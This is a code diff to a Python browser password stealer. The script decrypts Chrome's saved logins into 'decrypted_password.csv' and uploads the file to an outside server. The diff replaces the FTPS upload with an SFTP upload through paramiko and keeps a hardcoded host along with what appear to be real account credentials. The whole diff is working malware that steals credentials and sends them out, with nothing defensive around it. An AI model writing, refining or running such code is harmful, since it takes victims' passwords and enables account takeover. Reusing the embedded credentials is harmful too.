@@ -8,7 +8,7 @@ import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
 import csv
-from ftplib import FTP_TLS  # Import FTP_TLS instead of FTP
+import paramiko
 
 # Global Constants
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
@@ -56,17 +56,18 @@ def get_db_connection(chrome_path_login_db):
         print("[ERR] Chrome database cannot be found")
         return None
 
-def upload_to_ftps(filename, ftps_server, ftps_username, ftps_password):
+def upload_to_sftp(filename, sftp_server, sftp_port, sftp_username, sftp_password):
     try:
-        ftps = FTP_TLS(ftps_server)  # Use FTP_TLS for secure connection
-        ftps.login(ftps_username, ftps_password)
-        ftps.prot_p()  # Switch to secure data connection
-        with open(filename, 'rb') as file:
-            ftps.storbinary(f'STOR {filename}', file)
-        ftps.quit()
-        print(f'Successfully uploaded {filename} to FTPS.')
+        transport = paramiko.Transport((sftp_server, sftp_port))
+        transport.connect(username=sftp_username, password=sftp_password)
+        
+        sftp = paramiko.SFTPClient.from_transport(transport)
+        sftp.put(filename, f'/path/to/upload/{filename}')  # Adjust the remote path as necessary
+        sftp.close()
+        transport.close()
+        print(f'Successfully uploaded {filename} to SFTP.')
     except Exception as e:
-        print(f'Failed to upload {filename} to FTPS. Error: {e}')
+        print(f'Failed to upload {filename} to SFTP. Error: {e}')
 
 if __name__ == '__main__':
     try:
@@ -89,10 +90,11 @@ if __name__ == '__main__':
                     cursor.close()
                     conn.close()
                     os.remove("Loginvault.db")
-        # Upload to FTPS
-        ftps_server = 'us-east-1.sftpcloud.io'  # Replace with your FTPS server
-        ftps_username = '86cb675c25c04e65a4e653a6f618152d'  # Replace with your FTPS username
-        ftps_password = 'uaaAKNB3CNvaSWfcnu2CVAwRCFTACJPR'  # Replace with your FTPS password
-        upload_to_ftps('decrypted_password.csv', ftps_server, ftps_username, ftps_password)
+        # SFTP upload details
+        sftp_server = 'us-east-1.sftpcloud.io'  # Replace with your SFTP server
+        sftp_port = 22  # SFTP default port; adjust if necessary
+        sftp_username = '86cb675c25c04e65a4e653a6f618152d'  # Replace with your SFTP username
+        sftp_password = 'uaaAKNB3CNvaSWfcnu2CVAwRCFTACJPR'  # Replace with your SFTP password
+        upload_to_sftp('decrypted_password.csv', sftp_server, sftp_port, sftp_username, sftp_password)
     except Exception as e:
         print("[ERR] %s" % str(e))
